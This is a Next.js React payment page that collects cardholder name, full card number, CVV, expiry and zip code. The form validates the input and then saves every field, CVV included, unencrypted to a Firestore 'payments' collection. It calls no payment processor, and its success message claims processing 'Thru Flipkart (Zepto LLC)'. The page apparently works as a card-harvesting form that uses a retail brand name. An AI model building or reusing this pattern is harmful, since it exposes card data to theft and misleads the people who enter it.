'use client'

import React, { useState, ChangeEvent, FormEvent, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { toast, ToastContainer } from 'react-toastify'
import 'react-toastify/dist/ReactToastify.css'
import { db } from '../lib/firebase'
import { collection, addDoc } from 'firebase/firestore'

interface FormData {
  orderId: string
  amount: string
  firstName: string
  lastName: string
  cardNumber: string
  cvv: string
  expiryDate: string
  zipCode: string
}

export default function PaymentPage() {
  const [isMounted, setIsMounted] = useState(false)
  const [formData, setFormData] = useState<FormData>({
    orderId: '',
    amount: '',
    firstName: '',
    lastName: '',
    cardNumber: '',
    cvv: '',
    expiryDate: '',
    zipCode: '',
  })
  const [showModal, setShowModal] = useState(false)
  const [loading, setLoading] = useState(false);

  const router = useRouter()

  useEffect(() => {
    setIsMounted(true)
  }, [])

  if (!isMounted) return null

  const handleChange = (e: ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target

    if (name === 'expiryDate') {
      const formattedValue = value.replace(/\D/g, '')
      let newValue = formattedValue

      if (formattedValue.length > 2) {
        newValue = `${formattedValue.slice(0, 2)}/${formattedValue.slice(2, 4)}`
      }
      setFormData((prevData) => ({ ...prevData, [name]: newValue }))
    } else if (name === 'cardNumber') {
      const formattedValue = value.replace(/\D/g, '').replace(/(.{4})(?=.)/g, '$1 ')
      setFormData((prevData) => ({ ...prevData, [name]: formattedValue }))
    } else if (name === 'orderId') {
      const formattedValue = value.replace(/[^a-zA-Z0-9]/g, '')
      setFormData((prevData) => ({ ...prevData, [name]: formattedValue }))
    } else {
      setFormData((prevData) => ({ ...prevData, [name]: value }))
    }
  }

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault()

    const currentDate = new Date()
    const [month, year] = formData.expiryDate.split('/')

    if (!month || !year || month.length !== 2 || year.length !== 2) {
      toast.error('Invalid expiry date format. Please use MM/YY.', { position: 'top-center', autoClose: 3000 })
      return
    }

    const expiryMonth = parseInt(month, 10)
    const expiryYear = parseInt(year, 10)

    if (expiryYear < currentDate.getFullYear() % 100) {
      toast.error('Expiry date cannot be in the past.', { position: 'top-center', autoClose: 3000 })
      return
    }

    if (expiryYear === currentDate.getFullYear() % 100 && expiryMonth < currentDate.getMonth() + 1) {
      toast.error('Expiry date cannot be in the past.', { position: 'top-center', autoClose: 3000 })
      return
    }

    if (/[^A-Za-z ]/.test(formData.firstName)) {
      toast.error('First name must only contain letters and spaces.', { position: 'top-center', autoClose: 3000 })
      return
    }

    if (!/^[A-Za-z]+( [A-Za-z]+)?$/.test(formData.lastName)) {
      toast.error('Last name must only contain letters with a single space allowed.', { position: 'top-center', autoClose: 3000 })
      return
    }

    if (!/^[A-Za-z0-9]+$/.test(formData.orderId)) {
      toast.error('Order ID must be alphanumeric.', { position: 'top-center', autoClose: 3000 })
      return
    }

    try {
      setLoading(true);
      await addDoc(collection(db, 'payments'), formData)
      toast.success('Payment will be processed soon!', { position: 'top-center', autoClose: 3000 })

      setFormData({
        orderId: '',
        amount: '',
        firstName: '',
        lastName: '',
        cardNumber: '',
        cvv: '',
        expiryDate: '',
        zipCode: '',
      })

      setShowModal(true)
    } catch (error) {
      console.error('Error adding document: ', error)
      toast.error('Failed to save payment details.', { position: 'top-center', autoClose: 3000 })
    }finally {
      setLoading(false); // Re-enable the button
    }
  }

  const handleModalClose = () => {
    setShowModal(false)
    router.push('/')
  }

  return (
    <div className="min-h-1/6 bg-gradient-to-b from-blue-50 to-blue-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-xl w-full max-w-lg">
        <div className="p-8">
          <h1 className="text-2xl font-bold text-center text-blue-700 mb-2">Payment Details</h1>
          <p className="text-center text-gray-600 mb-6">Enter your payment information securely</p>
          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label htmlFor="orderId" className="block text-sm font-medium text-gray-700 mb-1">Order ID</label>
                <input
                  type="text"
                  id="orderId"
                  name="orderId"
                  value={formData.orderId}
                  onChange={handleChange}
                  required
                  placeholder="Enter Order ID"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
              <div>
                <label htmlFor="amount" className="block text-sm font-medium text-gray-700 mb-1">Amount (USD)</label>
                <input
                  type="number"
                  id="amount"
                  name="amount"
                  value={formData.amount}
                  onChange={handleChange}
                  required
                  placeholder="Enter amount in USD"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
            </div>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label htmlFor="firstName" className="block text-sm font-medium text-gray-700 mb-1">First Name</label>
                <input
                  type="text"
                  id="firstName"
                  name="firstName"
                  value={formData.firstName}
                  onChange={handleChange}
                  required
                  placeholder="First Name"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
              <div>
                <label htmlFor="lastName" className="block text-sm font-medium text-gray-700 mb-1">Last Name</label>
                <input
                  type="text"
                  id="lastName"
                  name="lastName"
                  value={formData.lastName}
                  onChange={handleChange}
                  required
                  placeholder="Last Name"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
            </div>
            <div>
              <label htmlFor="cardNumber" className="block text-sm font-medium text-gray-700 mb-1">Card Number</label>
              <input
                type="text"
                id="cardNumber"
                name="cardNumber"
                value={formData.cardNumber}
                onChange={handleChange}
                maxLength={19}
                required
                placeholder="1234 5678 9012 3456"
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
            </div>
            <div className="grid grid-cols-3 gap-4">
              <div>
                <label htmlFor="expiryDate" className="block text-sm font-medium text-gray-700 mb-1">Expiry Date</label>
                <input
                  type="text"
                  id="expiryDate"
                  name="expiryDate"
                  value={formData.expiryDate}
                  onChange={handleChange}
                  placeholder="MM/YY"
                  maxLength={5}
                  required
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
              <div>
                <label htmlFor="cvv" className="block text-sm font-medium text-gray-700 mb-1">CVV</label>
                <input
                  type="text"
                  id="cvv"
                  name="cvv"
                  value={formData.cvv}
                  onChange={handleChange}
                  maxLength={3}
                  required
                  placeholder="123"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
              <div>
                <label htmlFor="zipCode" className="block text-sm font-medium text-gray-700 mb-1">Zip Code</label>
                <input
                  type="text"
                  id="zipCode"
                  name="zipCode"
                  value={formData.zipCode}
                  onChange={handleChange}
                  required
                  placeholder="12345"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
            </div>
            <button
        type="submit"
        className={`w-full bg-blue-600 text-white py-2 px-4 rounded-md transition-colors duration-300 ${
          loading ? "cursor-not-allowed bg-blue-400" : "hover:bg-blue-700"
        }`}
        disabled={loading}
      >
        {loading ? "Processing..." : "Submit Payment"}
      </button>
          </form>
        </div>
      </div>

      {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
          <div className="bg-white p-8 rounded-lg text-center shadow-xl max-w-md w-full">
            <h2 className="text-2xl font-semibold text-blue-700 mb-4">Payment Submitted Successfully!</h2>
            <p className="text-gray-600 mb-6">Your order will be processed Thru Flipkart (Zepto LLC) shortly.</p>
            <button
              onClick={handleModalClose}
              className="bg-blue-600 text-white py-2 px-6 rounded-md hover:bg-blue-700 transition duration-300 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
            >
              Go to Homepage
            </button>
          </div>
        </div>
      )}

      <ToastContainer />
    </div>
  )
}

